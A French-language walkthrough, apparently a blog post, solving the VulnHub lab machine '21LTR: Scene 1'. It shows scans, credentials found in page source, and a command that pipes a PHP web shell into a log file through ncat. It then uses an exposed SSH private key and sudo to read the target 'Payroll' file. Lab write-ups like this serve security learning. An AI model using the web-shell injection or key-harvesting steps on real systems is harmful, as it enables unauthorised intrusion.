# Solution du CTF 21LTR: Scene 1 de VulnHub

Laissez moi vous introduire...
------------------------------

[21LTR: Scene 1](https://www.vulnhub.com/entry/21ltr-scene-1,3/) est un vieux CTF (juin 2012 !) présent sur *VulnHub*.  

Il s'agit d'un live CD *Slax* customisé (ça ne rajeunira personne...)  

L'objectif du challenge est de récupérer le *"Payroll"*  

```plain
Nmap scan report for 192.168.2.120
Host is up (0.00057s latency).
Not shown: 65504 closed ports, 28 filtered ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     ProFTPD 1.3.1
22/tcp open  ssh     OpenSSH 5.1 (protocol 1.99)
| ssh-hostkey:
|   2048 0f:17:f5:40:12:3c:5e:2c:79:59:01:81:d6:c9:71:0d (RSA1)
|   1024 fa:cf:94:5c:60:52:f7:d2:f5:18:7b:94:a9:71:4a:94 (DSA)
|_  2048 81:45:ca:87:4a:16:46:d9:25:89:07:ba:e8:38:25:0b (RSA)
|_sshv1: Server supports SSHv1
80/tcp open  http    Apache httpd 2.2.13 ((Unix) DAV/2 PHP/5.2.10)
|_http-server-header: Apache/2.2.13 (Unix) DAV/2 PHP/5.2.10
|_http-title: Intranet Development Server
MAC Address: 08:00:27:3B:3E:02 (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 2.6.X
OS CPE: cpe:/o:linux:linux_kernel:2.6
OS details: Linux 2.6.13 - 2.6.32
Network Distance: 1 hop
Service Info: OS: Unix
```

Avec un brute-forceur de noms de dossiers et fichiers on trouve rapidement un dossier *logs*.  

```plain
http://192.168.2.120/cgi-bin/ - HTTP 403 (210 bytes, plain)
http://192.168.2.120/logs/ - HTTP 403 (207 bytes, plain)
http://192.168.2.120/index.php - HTTP 200 (1323 bytes, plain)
```

Et dans le code source de la page d'index on retrouve des identifiants :  

```html
<!-- username:logs password:zg]E-b0]+8:(58G -->
```

Ces derniers permettent une connexion sur le serveur *ProFTPD* :  

```plain
-rwxrwxrwx   1 root     root         1450 Jun  8  2012 backup_log.php
```

Tout comme 2 et 2 font 4 on devine que le fichier PHP se trouve à l'adresse */logs/backup\_log.php* sur le serveur web.  

Le fichier étant lisible par tous (mais non écrasable) on a accès au code source :  

```php
<html>
        <head>
                <title></title>
        </head>
        <body>
                <h2 style="text-align: center">
                        Intranet Dev Server Backup Log</h2>
                        <?php $log = time(); echo '<center><b>GMT time is: '.gmdate('r', $log).'</b></center>'; ?>
                <p>
                        &nbsp;</p>
                <h4>
                        Backup Errors:</h4>
                <p>
                        &nbsp;</p>
        </body>
</html>

Wed, 03 Jan 2012 09:51:42 +0000 from 192.168.2.240: Permission denied
<br><br>
Thu, 04 Jan 2012 13:11:29 +0000 from 192.168.2.240: No Such file or directory
<br><br>
Thu, 04 Jan 2012 13:31:36 +0000 from 192.168.2.240: No space left on device
<br><br>
Thu, 04 Jan 2012 13:41:36 +0000 from 192.168.2.240: No Space left on device
<br><br>
Mon, 16 Feb 2012 17:01:02 +0000 from 192.168.2.240: No Space left on device
<br><br>
Fri, 23 Apr 2012 10:51:07 +0000 from 192.168.2.240: No Space left on device
<br><br>
Fri, 12 May 2012 16:41:32 +0000 from 192.168.2.240: No Space Left on device
<br><br>
```

Il semble qu'un mécanisme quelconque rajoute des lignes à ce fichier.  

Vu que l'on ne trouve rien d'autre d'intéressant sur ce serveur (malgré la présence de *DAV* dans les entêtes) et que la machine semble interagir avec l'adresse 192.168.2.240, je reconfigure *vboxnet0* pour avoir cette adresse IP.  

Le facteur sonne toujours deux fois
-----------------------------------

Lancement de Wireshark, au bout d'un moment, un TCP SYN arrive sur notre port tcp 10000.  

La machine semble envoyer en brut une archive au format tar.gz (on peut l'obtenir en redirigeant avec un ncat ou en extrayant les données depuis Wireshark).  

Une fois décompressé on obtient un fichier *media/backup/pxelinux.cfg.tar.gz*  

Voici le contenu du dossier *pxelinux.cfg*:  

```plain
default:    ASCII text
dnsmasq:    ELF 32-bit LSB executable, Intel 80386, version 1 (GNU/Linux), statically linked, stripped
pxelinux.0: pxelinux loader
start:      Bourne-Again shell script, ASCII text executable
web:        directory
```

et du dossier web :  

```plain
conf:   directory
monkey: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.16, stripped
start:  Bourne-Again shell script, ASCII text executable
```

*monkey* est exécutable compressé avec *UPX*. Une fois décompressé on trouve des chaînes de caractères faisant référence au serveur web [Monkey](http://www.monkey-project.com/) en version 0.9.2.  

Les fichiers de l'archive n'ont aucune réelle valeur pour nous.

On remarque que le processus d'envoi de l'archive se répète toutes les 10 minutes.  

En refaisant un scan TCP à un moment un nouveau port est apparu sur la machine : 10001.  

Je tente de m'y connecter avec Ncat mais le port est fermé. Le port s'ouvre t-il uniquement à la fin de l'upload du fichier ?  

Je relance un listener Ncat et lors de la réception je me connecte sur le 10001 : ouvert !  

Le port semble lire le flux ligne par ligne (ça utilise peut être netcat), je saisis ainsi deux messages avant de *Ctrl+C* et je vois mes messages se trouver à la fin du fichier *backup\_log.php* :-)  

Pour injecter une backdoor dans le fichier PHP la commande suivante fonctionne :  

```bash
ncat -l -p 10000 -v; echo '<?php system($_GET["cmd"]); ?>' | ncat 192.168.2.120 10001 -v
```

On a bien évidemment les droits d'Apache :  

```plain
uid=80(apache) gid=80(apache) groups=80(apache)
```

sur un système Linux qui date un peu :p   

```plain
Linux slax 2.6.27.27 #1 SMP Wed Jul 22 07:27:34 AKDT 2009 i686 Intel(R) Core(TM) i5-7200U CPU @ 2.50GHz GenuineIntel GNU/Linux
```

Il y a trois users sur le système (hors root et autres daemons) :  

```plain
hbeale:x:1001:10:,,,:/home/hbeale:/bin/bash
jgreen:x:1002:10:,,,:/home/jgreen:/bin/bash
logs:x:1003:100:,,,:/tmp:/bin/bash
```

Ces users font partie des groupes suivants :  

```plain
uid=1002(jgreen) gid=10(wheel) groups=10(wheel)
uid=1001(hbeale) gid=10(wheel) groups=10(wheel)
uid=1003(logs) gid=100(users) groups=100(users)
```

On ne trouve rien de particulier dans crontab, permissions, exécutables set(u/g)id, ports en écoute ou process...  

On trouve facilement le fichier *Payroll* mais il n'est pas accessible avec notre user :  

```plain
-r-------- 1 jgreen users 613 Jun  6  2012 /home/jgreen/.local/share/Trash/files/Payroll
```

Cela dis il est lisible via un autre path (*/mnt/live/mnt/hdc/slax/rootcopy/home/jgreen/.local/share/Trash/files/Payroll*)... c'est la magie de ces vieux live CDs :D  

Mais clairement ça ne doit pas être la méthode attendue de résoudre le CTF alors, en tant que gentleman, on va la jouer réglo...  

Les clés sont sous le paillasson
--------------------------------

Peut-être faut-il exploiter le processus de génération de l'archive de backup. Jetons un œil à ce qui se trouve dans */media* :  

```plain
total 0
drwxrwxrwx  4 root root  80 Jun  6  2012 .
drwxr-xr-x 93 root root 300 Jan 23 20:12 ..
drwxrwxrwx  3 root root 120 Jun 19  2012 USB_1
drwxrwxrwx  2 root root  80 Jan 24 06:53 backup

/media/USB_1:
total 2728
drwxrwxrwx 3 root root     120 Jun 19  2012 .
drwxrwxrwx 4 root root      80 Jun  6  2012 ..
-rwxrwxrwx 1 root root 1383853 Jun 19  2012 ProgrammingGroundUp-1-0-booksize.pdf
-rwxrwxrwx 1 root root  171249 Jun 19  2012 SerialProgrammingInPosixOSs.pdf
drwxrwxrwx 3 root root      80 Jun 19  2012 Stuff
-rwxrwxrwx 1 root root 1210710 Jun 19  2012 make.pdf

/media/USB_1/Stuff:
total 916
drwxrwxrwx 3 root root     80 Jun 19  2012 .
drwxrwxrwx 3 root root    120 Jun 19  2012 ..
drwxrwxrwx 2 root root     80 Jun  6  2012 Keys
-rwxrwxrwx 1 root root 928014 Jun 19  2012 bash.pdf

/media/USB_1/Stuff/Keys:
total 8
drwxrwxrwx 2 root root   80 Jun  6  2012 .
drwxrwxrwx 3 root root   80 Jun 19  2012 ..
-rwxrwxrwx 1 root root  393 Jun  2  2012 authorized_keys
-rwxrwxrwx 1 root root 1675 Jan  5  2008 id_rsa
```

Ohoh ! Je n'avais pas encore vu ce dossier *USB\_1* :)  

La clé privée SSH permet la connexion en *hbeale* une fois téléchargée et les bons droits (chmod 600) appliqués.  

```plain
$ ssh -i 21ltr_rsa.key hbeale@192.168.2.120
Linux 2.6.27.27.
hbeale@slax:~$ id
uid=1001(hbeale) gid=10(wheel) groups=10(wheel)
hbeale@slax:~$ sudo -l
User hbeale may run the following commands on this host:
    (root) NOEXEC: /bin/ls, (root) /usr/bin/cat, (root) /usr/bin/more, (root) !/usr/bin/su *root*
    (root) NOPASSWD: /usr/bin/cat
```

On peut exécuter cat via sudo et donc obtenir le contenu du fichier *Payroll* sans tricher :  

```plain
Contractors Name, Monthly Wage, Paid On, Paid From Holding Account, Actual Amount Paid, Margin Taken

Tony Burrows, $4500, 10/03/2012, 16/03/2012, $3900, $600
Josh Freeman, $3700, 10/03/2012, 16/03/2012, $3500, $200
Tom Tuddin, $3700, 10/03/2012, 16/03/2012, $3500, $200

Tony Burrows, $4500, 10/04/2012, 16/04/2012, $3900, $600
Josh Freeman, $3700, 10/04/2012, 16/04/2012, $3500, $200
Tom Tuddin, $3700, 10/04/2012, 16/04/2012, $3500, $200

Tony Burrows, $4500, 10/05/2012, 16/05/2012, $3900, $600
Josh Freeman, $3700, 10/05/2012, 16/05/2012, $3500, $200
Tom Tuddin, $3700, 10/05/2012, 16/05/2012, $3500, $200
```

Conclusion
----------

J'avais un peu peur en reprenant un vieux CTF car certains se basent uniquement sur l'existence de la dernière faille en vogue et il aurait fallut fouiller dans les archives pour déterrer (non pas mémé mais) la vulnérabilité si cela avait été le cas.  

Le challenge était intéressant et j'ai pu le résoudre rapidement toutefois j'ai sans doute eu de la chance d'avoir eu les bonnes idées au bon moment (je serais sans doute encore à fouiller si je n'avais pas re-scanné la machine à un moment où le port 10001 était ouvert).  


*Published January 24 2018 at 13:49*